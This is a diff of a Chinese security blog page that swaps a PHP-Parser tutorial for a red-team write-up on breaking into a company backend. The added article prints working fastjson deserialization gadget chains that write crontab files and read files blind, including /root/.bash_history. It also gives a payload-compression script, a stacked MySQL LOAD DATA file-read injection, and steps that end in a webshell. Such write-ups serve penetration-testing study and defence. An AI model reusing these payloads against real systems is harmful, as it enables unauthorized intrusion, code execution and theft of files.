@@ -5,15 +5,12 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PHP-Parser的基本使用 - RainSec</title>
+    <title>一次攻防小记 - RainSec</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="RainSec,"> 
-    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,PHP-ParserPHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。
-
-
-What is PHP-ParserPHP-Parser是nikic用PHP编写的PHP5.2,"> 
+    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,一次攻防小记​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。​,"> 
     <meta name="author" content="RainSec"> 
     <link rel="alternative" href="atom.xml" title="RainSec" type="application/atom+xml"> 
     <link rel="icon" href="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg"> 
@@ -79,7 +76,7 @@ What is PHP-ParserPHP-Parser是nikic用PHP编写的PHP5.2,">
     <div class="navigation animated fadeIn fast delay-1s">
         <img id="home-icon" class="icon-home" src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg" alt="" data-url="https://rainsec.cn">
         <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">PHP-Parser的基本使用</h3>
+        <h3 class="subtitle">一次攻防小记</h3>
         <div class="social">
             <!--        <div class="like-icon">-->
             <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -104,30 +101,30 @@ What is PHP-ParserPHP-Parser是nikic用PHP编写的PHP5.2,">
             animation-duration: 1.2s;
             background-image: 
                 radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-                url('https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/parsercover.png') ">
+                url('https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220824/scan.6q7shyuek6k0.png') ">
         </div>
         <div class="else">
             <p class="animated fadeInDown">
                 
-                <a href="/categories/漏洞挖掘"><b>「
-                    </b>漏洞挖掘<b> 」</b></a>
+                <a href="/categories/渗透测试"><b>「
+                    </b>渗透测试<b> 」</b></a>
                 
-                January 28, 2022
+                August 24, 2022
             </p>
-            <h3 class="post-title animated fadeInDown"><a href="/post/PHP-Parser.html" title="PHP-Parser的基本使用" class="">PHP-Parser的基本使用</a>
+            <h3 class="post-title animated fadeInDown"><a href="/post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html" title="一次攻防小记" class="">一次攻防小记</a>
             </h3>
             
             <p class="post-count animated fadeInDown">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    9.7k
+                    4.6k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    9 mins.
+                    4 mins.
                 </span>
                 
                 
@@ -140,7 +137,7 @@ What is PHP-ParserPHP-Parser是nikic用PHP编写的PHP5.2,">
             </p>
             
             
-            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
             
         </div>
     </div>
@@ -161,251 +158,94 @@ What is PHP-ParserPHP-Parser是nikic用PHP编写的PHP5.2,">
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <h1 id="PHP-Parser"><a href="#PHP-Parser" class="headerlink" title="PHP-Parser"></a>PHP-Parser</h1><p>PHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。</p>
-<span id="more"></span>
-
-<h2 id="What-is-PHP-Parser"><a href="#What-is-PHP-Parser" class="headerlink" title="What is PHP-Parser"></a>What is PHP-Parser</h2><p><code>PHP-Parser</code>是<code>nikic</code>用PHP编写的PHP5.2到PHP7.4解析器，其目的是简化静态代码分析和操作</p>
-<h2 id="PHP-Parser的基础使用"><a href="#PHP-Parser的基础使用" class="headerlink" title="PHP-Parser的基础使用"></a>PHP-Parser的基础使用</h2><p>这里先贴一下官方文档</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/nikic/PHP-Parser/tree/master/doc">PHP-Parser/doc at master · nikic/PHP-Parser (github.com)</a></p>
-<p>最基本的是要理解其中<a target="_blank" rel="noopener" href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Walking_the_AST.markdown">Walking the AST</a>的部分</p>
-<h2 id="初始化解析器"><a href="#初始化解析器" class="headerlink" title="初始化解析器"></a>初始化解析器</h2><p>首先创建实例</p>
-<pre><code class="php">use PhpParser\ParserFactory;
-$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);
+            <h1 id="一次攻防小记"><a href="#一次攻防小记" class="headerlink" title="一次攻防小记"></a>一次攻防小记</h1><p>​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。<br>​  这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1.2.68)，fatjson利用点只有两种响应，成功和失败，中间间是tomcat，不出网，然后开始尝试getshell。</p>
+<h2 id="fastjson利用"><a href="#fastjson利用" class="headerlink" title="fastjson利用"></a>fastjson利用</h2><p>随手一试fastjson jdk8 写文件的链</p>
+<pre><code class="json">{ "x":{
+        "@type":"java.lang.AutoCloseable", 
+        "@type":"sun.rmi.server.MarshalOutputStream",
+        "out":{
+            "@type":"java.util.zip.InflaterOutputStream",
+            "out":{
+                "@type":"java.io.FileOutputStream",
+                "file":"/var/spool/cron/crontabs/root",
+                "append":false
+            },
+            "infl":{
+                "input":"eJzTUtCCwswUBTsF_ZLcAv2U1OJivayCdABYLgeL"
+            },
+            "bufLen":1048576
+        },
+        "protocolVersion":1
+    }}
 </code></pre>
-<p>这其中有以下参数</p>
-<p>KindBehaviorParserFactory::PREFER_PHP7Try to parse code as PHP 7. If this fails, try to parse it as PHP 5.ParserFactory::PREFER_PHP5Try to parse code as PHP 5. If this fails, try to parse it as PHP 7.ParserFactory::ONLY_PHP7Parse code as PHP 7.ParserFactory::ONLY_PHP5Parse code as PHP 5.</p>
-<p>create还有一个参数Lexer，这里先不做讨论</p>
-<p>在实例化之后我们就可以通过</p>
-<pre><code class="php">$stmts = $parser-&gt;parse($code);
+<p>压缩数据生成</p>
+<pre><code class="python">from itsdangerous import base64_decode, base64_encode
+import zlib
+cc='hello'.encode()
+ccc=zlib.compress(cc)
+print(base64_encode(ccc))
 </code></pre>
-<p>来将代码转换成AST</p>
-<p>为了防止抛出异常，最好在try….catch中执行</p>
-<h3 id="生成更加直观的AST"><a href="#生成更加直观的AST" class="headerlink" title="生成更加直观的AST"></a>生成更加直观的AST</h3><p>当我们var_dump上面的$stmt时，会得到一个比较乱的AST，可以使用NodeDump将其转化为更加直观的AST</p>
-<p>这里需要使用NodeDump</p>
-<p>对于代码</p>
-<pre><code class="PHP">&lt;?php
-function printLine($msg) {
-    echo $msg, "\n";
-}
-printLine('Hello World!!!');
-</code></pre>
-<p>将其转换为AST</p>
-<pre><code class="PHP">&lt;?php
-use PhpParser\NodeDumper;
-$nodeDumper = new NodeDumper;echo $nodeDumper-&gt;dump($stmts), "\n";
-</code></pre>
-<p>得到以下输出</p>
-<pre><code class="YAML">array(
-    0: Stmt_Function(
-        byRef: false
-        name: Identifier(
-            name: printLine
-        )
-        params: array(
-            0: Param(
-                type: null
-                byRef: false
-                variadic: false
-                var: Expr_Variable(
-                    name: msg
-                )
-                default: null
-            )
-        )
-        returnType: null
-        stmts: array(
-            0: Stmt_Echo(
-                exprs: array(
-                    0: Expr_Variable(
-                        name: msg
-                    )
-                    1: Scalar_String(
-                        value:
-
-                    )
-                )
-            )
-        )
-    )
-    1: Stmt_Expression(
-        expr: Expr_FuncCall(
-            name: Name(
-                parts: array(
-                    0: printLine
-                )
-            )
-            args: array(
-                0: Arg(
-                    value: Scalar_String(
-                        value: Hello World!!!
-                    )
-                    byRef: false
-                    unpack: false
-                )
-            )
-        )
-    )
-)
-</code></pre>
-<h3 id="Node-tree-structure"><a href="#Node-tree-structure" class="headerlink" title="Node tree structure"></a>Node tree structure</h3><p>上面我们可以看到生成了很多的Node类型</p>
-<p>PHP是一个成熟的脚本语言，它大约有140个不同的节点。但是为了方便使用，将他们分为三类：</p>
-<ul>
-<li><p><code>PhpParser\Node\Stmts</code>是语句节点，即不返回值且不能出现在表达式中的语言构造。例如，类定义是一个语句，它不返回值，你不能编写类似func(class {})的语句。</p>
-</li>
-<li><p><code>PhpParser\Node\expr</code>是表达式节点，即返回值的语言构造，因此可以出现在其他表达式中。如：<code>$var (PhpParser\Node\Expr\Variable)</code>和<code>func() (PhpParser\Node\Expr\FuncCall)</code>。</p>
-</li>
-<li><p><code>PhpParser\Node\Scalars</code>是表示标量值的节点，如<code>"string" (PhpParser\Node\scalar\string)</code>、<code>0 (PhpParser\Node\scalar\LNumber)</code> 或魔术常量，如”<strong>FILE</strong>“ <code>(PhpParser\Node\scalar\MagicConst\FILE)</code> 。所有<code>PhpParser\Node\scalar</code>都是延伸自<code>PhpParser\Node\Expr</code>，因为scalar也是表达式。</p>
-</li>
-<li><p>需要注意的是<code>PhpParser\Node\Name</code>和<code>PhpParser\Node\Arg</code>不在以上的节点之中</p>
-</li>
-</ul>
-<h3 id="Pretty-printer"><a href="#Pretty-printer" class="headerlink" title="Pretty printer"></a>Pretty printer</h3><p>Prettyprinter用来将我们修改后的AST转换回PHP代码，使用如下</p>
-<pre><code class="php">use PhpParser\Error;
-use PhpParser\ParserFactory;
-use PhpParser\PrettyPrinter;
-$code = "&lt;?php echo 'Hi ', hi\\getTarget();";
-$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$prettyPrinter = new PrettyPrinter\Standard;
-try {
-    //生成AST
-    $stmts = $parser-&gt;parse($code);
-    //对节点进行操作
-    $stmts[0]         // the echo statement
-          -&gt;exprs     // sub expressions
-          [0]         // the first of them (the string node)
-          -&gt;value     // it's value, i.e. 'Hi '
-          = 'Hello '; // change to 'Hello '
-
-    // pretty print
-    $code = $prettyPrinter-&gt;prettyPrint($stmts);
-    echo $code;
-} catch (Error $e) {
-    echo 'Parse Error: ', $e-&gt;getMessage();
+<p>居然成功了，写个jpg，用上面的文件读取也能读到写入的文件，当时就感觉有机会，但是苦于没有路径，然后试commons-io 发现存在依赖，尝试读文件的链子</p>
+<pre><code class="json">{
+  "abc":{"@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
+      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
+        "url": "file:///tmp/"
+      },
+      "charsetName": "UTF-8",
+      "bufferSize": 1024
+    },"boms": [
+      {
+        "@type": "org.apache.commons.io.ByteOrderMark",
+        "charsetName": "UTF-8",
+        "bytes": [
+          ...
+        ]
+      }
+    ]
+  },
+  "address" : {"$ref":"$.abc.BOM"}
 }
 </code></pre>
-<p>在反混淆中我们一般很少使用$stmts[0]这种方式，因为我们要考虑节点的各种类型</p>
-<p>此外还有prettyPrintExpr()，它可以用来输出一个表达式类型的节点</p>
-<p>例如当你需要提取全局变量时</p>
-<pre><code class="PHP">&lt;?php
-    $a = $_POST['a'];
-</code></pre>
-<p>他的语法树如下</p>
-<pre><code class="YAML">0: Stmt_Expression(
-        expr: Expr_Assign(
-            var: Expr_Variable(
-                name: a
-            )
-            expr: Expr_ArrayDimFetch(
-                var: Expr_Variable(
-                    name: _POST
-                )
-                dim: Scalar_String(
-                    value: a
-                )
-            )
-        )
-    )
-</code></pre>
-<p>如果我想获取$_POST[‘a’],我就需要先判断节点类型是不是<code>Expr_ArrayDimFetch</code></p>
-<p>然后判断<code>$node-&gt;var-&gt;name</code>是不是全局变量</p>
-<p>最后提取<code>$node-&gt;var-&gt;name</code>和<code>$node-&gt;dim-&gt;value</code>然后将它们拼接</p>
-<p>当我的全局变量为<code>$_POST[a]</code>时，dim部分的AST也会变化，我们还需要考虑这种情况。</p>
-<p>但是我们可以使用</p>
-<pre><code class="PHP">/*
-    用来识别全局变量;
-    如果要获取全局变量格式无需考虑value的节点类型
-    expr: Expr_ArrayDimFetch(
-            var: Expr_Variable(
-                name: _POST
-            )
-    )
-*/
-        if ($node instanceof Node\Expr\ArrayDimFetch &amp;&amp; $node-&gt;var instanceof Node\Expr\Variable &amp;&amp; (in_array($node-&gt;var-&gt;name ,GLOBAL_VAR)))
-        {
-            self::$globalname = $this-&gt;prettyPrinter-&gt;prettyPrintExpr($node);
-        }
-</code></pre>
-<p>其中</p>
-<pre><code class="PHP">$this-&gt;prettyPrinter-&gt;prettyPrintExpr($node);
-</code></pre>
-<p>就会返回该Expr节点的表达式，无论是<code>$_POST['a']</code>还是<code>$_POST[a]</code>都可以正常返回</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Pretty_printing.markdown">PHP-Parser/Pretty_printing.markdown at master · nikic/PHP-Parser (github.com)</a></p>
-<h2 id="Node-traversation"><a href="#Node-traversation" class="headerlink" title="Node traversation"></a>Node traversation</h2><p>我们使用PHP-Parser对文件的节点进行修改，最关键的就是编写节点遍历操作</p>
-<p>使用<code>PhpParser\NodeTraverser</code>我们可以遍历每一个节点，举几个简单的例子：解析php中的所有字符串，并输出</p>
-<pre><code class="PHP">&lt;?php
-use PhpParser\Error;
-use PhpParser\ParserFactory;
-use PhpParser\NodeTraverser;
-use PhpParser\NodeVisitorAbstract;
-use PhpParser\Node;
-
-require 'vendor/autoload.php';
-
-class MyVisitor extends NodeVisitorAbstract{
-    public function leaveNode(Node $node)
-    {
-        //判断如果是一个String_节点，就输出
-        if ($node instanceof Node\Scalar\String_)
-        {
-            echo $node -&gt; value,"\n";
-        }
-
-    }
-}
-
-$code = file_get_contents("./test.php");
-
-//实例化解释器
-$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);
-$traverser = New NodeTraverser;
-//添加自己的Visitor
-$traverser-&gt;addVisitor(new MyVisitor);
-
-try {
-    //转化AST
-    $ast = $parser-&gt;parse($code);
-    //开始遍历
-    $stmts = $traverser-&gt;traverse($ast);
-} catch (Error $error) {
-    echo "Parse error: {$error-&gt;getMessage()}\n";
-    return;
-}
-
-?&gt;
-</code></pre>
-<p>替换php脚本中函数以及类的成员方法函数名为小写</p>
-<pre><code class="PHP">class MyVisitor extends NodeVisitorAbstract{
-    public function leaveNode(Node $node)
-    {
-        if( $node instanceof Node\Expr\FuncCall) {
-            $node-&gt;name-&gt;parts[0]=strtolower($node-&gt;name-&gt;parts[0]);
-        }elseif($node instanceof Node\Stmt\ClassMethod){
-            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);
-        }elseif ($node instanceof Node\Stmt\Function_){
-            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);
-        }elseif($node instanceof Node\Expr\MethodCall){
-            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);
-        }
-    }
+<p>但是没有回显，无法判断，随后拜读浅蓝师傅的文章 <a target="_blank" rel="noopener" href="https://b1ue.cn/archives/506.html">https://b1ue.cn/archives/506.html</a></p>
+<p>前面读文件的链子bytes和读的文件匹配，getBOM会返回这个bytes，然后下面利用类型不匹配，让fastjson报错，服务器返回“错误”，来实现盲注读文件</p>
+<p>通过读/root/.bash_history等拿到tomcat路径</p>
+<pre><code class="json">{
+  "abc":{"@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
+      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
+        "url": "file:///tmp/test"
+      },
+      "charsetName": "UTF-8",
+      "bufferSize": 1024
+    },"boms": [
+      {
+        "@type": "org.apache.commons.io.ByteOrderMark",
+        "charsetName": "UTF-8",
+        "bytes": [
+          98
+        ]
+      }
+    ]
+  },
+  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}
 }
 </code></pre>
-<p>需要注意的是所有的<code>visitors</code>都必须实现<code>PhpParser\NodeVisitor</code>接口，该接口定义了如下4个方法：</p>
-<pre><code class="PHP">public function beforeTraverse(array $nodes);
-public function enterNode(\PhpParser\Node $node);
-public function leaveNode(\PhpParser\Node $node);
-public function afterTraverse(array $nodes);
+<p>但是很可惜，实战环境有点复杂，经过小修改之后链子只能用来探测路径或文件是否存在，无论如何类型匹配那都不报错，笔者尝试不读文件进行对比，直接返回byte，实战环境也不报错，只能fuzz一下tomcat路径，也没fuzz出来，gg。</p>
+<h2 id="写计划任务"><a href="#写计划任务" class="headerlink" title="写计划任务"></a>写计划任务</h2><p>试了一下写计划任务，/var/spool/cron/root写不进去，很奇怪（后来发现是队长开始写了一次，写进去了，但是语法有问题，文件不知道为啥被锁了，后来就写不进去了，覆盖追加都不行），尝试其他用户常见用户名也都失败，用mysql读了一下安装路径，发现是/home/soft ,写/var/spool/cron/soft ，也没执行，窒息.jpg。</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>fastjson没啥看了，去深入一下注入，发现可以堆叠，在secure-file-priv=NULL时，可以尝试下面这种方法读文件 ,很全的一篇mysql注入文章 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169#toc-32">https://xz.aliyun.com/t/7169#toc-32</a></p>
+<pre><code class="SQL">drop table mysql.m1;
+CREATE TABLE mysql.m1 (code TEXT );
+LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';
+select * from mysql.m1;
 </code></pre>
-<ul>
-<li><p><code>beforeTraverse</code>方法在遍历开始之前调用一次，并将其传递给调用遍历器的节点。此方法可用于在遍历之前重置值或准备遍历树。</p>
-</li>
-<li><p><code>afterTraverse</code>方法与<code>beforeTraverse</code>方法类似，唯一的区别是它只在遍历之后调用一次。</p>
-</li>
-<li><p>在每个节点上都调用<code>enterNode</code>和<code>leaveNode</code>方法，前者在它被输入时，即在它的子节点被遍历之前，后者在它被离开时。</p>
-</li>
-<li><p>这四个方法要么返回更改的节点，要么根本不返回(即null)，在这种情况下，当前节点不更改。</p>
-</li>
-</ul>
-<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><a target="_blank" rel="noopener" href="http://j0k3r.top/2020/03/24/php-Deobfuscator/#0x01-php-parser">基于 AST（抽象语法树）解 PHP 混淆 | J0k3r’s Blog</a></p>
-<h2 id="P-S"><a href="#P-S" class="headerlink" title="P.S."></a>P.S.</h2><p>我们需要知道你需要什么样的Node，进行什么样的操作，Node下数据的格式会有哪几种情况，会不会因为代码不够严谨导致错误或者无限递归</p>
+<p>可惜还是不行，后来才知道在local_infile变量开启时候这种方法才可以读到文件，另外这站还是站库分离，mysql在阿里云上，当时竟然没测一下，浪费了不少时间，还是菜，当然这都是后话，泪.jpg。<br>到现在没得其他思路了，而且这个站已经搞了好几天了，也没搞下来，太菜了呜呜呜。</p>
+<h2 id="二战"><a href="#二战" class="headerlink" title="二战"></a>二战</h2><p>过了两天又来日这个站，另一个师傅扫了一下目录，发现个nginx的配置文件，配置文件可以看出这个站的后台接口是被代理到另一个内网服务器，配置文件里还发现个转发服务器地址，它刚好有个druid，刚好是个弱口令，主页看到classpath，/root/soft/apache-tomcatxxxxxx（xxxxx为版本号） ,刚好这个站也有个soft用户，回去一试，/home/soft/apache-tomcatxxxxx路径存在！！！！！！！！！！！！！<br>随后就是写shell了，不知道为啥完整的shell压缩之后用fastjson写进去会报错，把shell分成几部分追加写，写文件链子里的append false改为true。<br>附一个笔者常用的在没有waf的情况下检测fastjosn的小技巧，json数据里，加上 </p>
+<pre><code class="json">"@type":"xxxx"
+</code></pre>
+<p>一般是fatjson就会报错，这次这个站就是这么发现的，后台接口很多，但是只有这一个地方的一个参数传的是json数据,也不出网。<br>小总结一下吧，端口要扫全，弱口令都要试一下，能爆破就爆破，目录该扫也要扫，毕竟渗透本质是信息收集。</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -442,9 +282,9 @@ public function afterTraverse(array $nodes);
         <div class="sidebar">
             <div class="box animated fadeInRight">
                 <div class="subbox">
-                    <img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/zitui_logo.jpg" height=300 width=300></img>
-                    <p>Zitui</p>
-                    <span>纯纯的飞舞</span>
+                    <img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220721/cop.3c6tiszrlxs0.jpg" height=300 width=300></img>
+                    <p>COP</p>
+                    <span>疯狂造轮子</span>
                     <dl>
                         
                         
@@ -472,7 +312,7 @@ public function afterTraverse(array $nodes);
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-Parser"><span class="toc-number">1.</span> <span class="toc-text">PHP-Parser</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-PHP-Parser"><span class="toc-number">1.1.</span> <span class="toc-text">What is PHP-Parser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Parser%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">PHP-Parser的基础使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E8%A7%A3%E6%9E%90%E5%99%A8"><span class="toc-number">1.3.</span> <span class="toc-text">初始化解析器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9B%B4%E5%8A%A0%E7%9B%B4%E8%A7%82%E7%9A%84AST"><span class="toc-number">1.3.1.</span> <span class="toc-text">生成更加直观的AST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Node-tree-structure"><span class="toc-number">1.3.2.</span> <span class="toc-text">Node tree structure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pretty-printer"><span class="toc-number">1.3.3.</span> <span class="toc-text">Pretty printer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-traversation"><span class="toc-number">1.4.</span> <span class="toc-text">Node traversation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.5.</span> <span class="toc-text">例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P-S"><span class="toc-number">1.6.</span> <span class="toc-text">P.S.</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">一次攻防小记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">fastjson利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">写计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%88%98"><span class="toc-number">1.4.</span> <span class="toc-text">二战</span></a></li></ol></li></ol>
                 </div>
             </div>
             
